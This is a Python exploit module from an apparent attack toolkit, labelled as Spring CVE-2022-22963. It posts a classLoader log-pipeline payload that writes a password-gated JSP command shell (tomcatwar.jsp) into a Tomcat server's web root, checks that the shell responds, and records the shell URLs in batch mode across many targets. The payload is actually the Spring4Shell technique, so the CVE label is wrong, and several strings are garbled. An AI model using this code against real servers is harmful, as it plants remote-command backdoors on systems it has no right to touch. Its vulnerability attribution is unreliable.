#!/user/bin/env python3
# -*- coding: utf-8 -*-
import requests
from pub.com.outprint import OutPrintInfo,OutPrintInfoSuc
from pub.com.reqset import ReqSet
from urllib.parse import urljoin
import urllib3
urllib3.disable_warnings()
class Cve_2022_22963:
    def Exploit(self,url):
        headers = {"suffix": "%>//",
                   "c1": "Runtime",
                   "c2": "<%",
                   "DNT": "1",
                   "User-Agent": self.header,
                   "Content-Type": "application/x-www-form-urlencoded"

                   }
        data = "class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22j%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%7D%20%25%7Bsuffix%7Di&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix=tomcatwar&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat="
        try:

            go = requests.post(url, headers=headers, data=data, timeout=15, allow_redirects=False, verify=self.ssl,proxies=self.proxy)
            shellurl = urljoin(url, 'tomcatwar.jsp')
            shellgo = requests.get(shellurl, timeout=15, allow_redirects=False,headers={"User-Agent":self.header}, verify=self.ssl,proxies=self.proxy)
            if shellgo.status_code == 200:
                if self.batch:
                    OutPrintInfoSuc("Spring",
                                 f"Shell Address is :{shellurl}?pwd=j&cmd=whoami")
                    with open("./result/spring_2022_22963.txt","a") as w:
                        w.write(f"{shellurl}?pwd=j&cmd=whoami\n")
                else:
                    OutPrintInfoSuc("Spring",
                                 f"The vulnerability exists, the shell address is :{shellurl}?pwd=j&cmd=whoami")
                return True
            return False
        except Exception as e:
            if not self.batch:
                OutPrintInfo("Spring",e)
            return False

    def main(self,target):
        self.batch = target["batch_work"]
        url = target["url"].strip('/ ')
        self.ssl = target["ssl"]
        self.header = target["header"]
        proxy = target["proxy"]
        _, self.proxy = ReqSet(proxy=proxy, bwork=self.batch)
        if not self.batch:
            OutPrintInfo("Spring", '开始执行Spring CVE-2022-22963程代码执行漏洞...')
        self.Exploit(url)
        if not self.batch:
            OutPrintInfo("Spring", 'Spring CVE-2022-22963程代码执行漏洞检测结束')


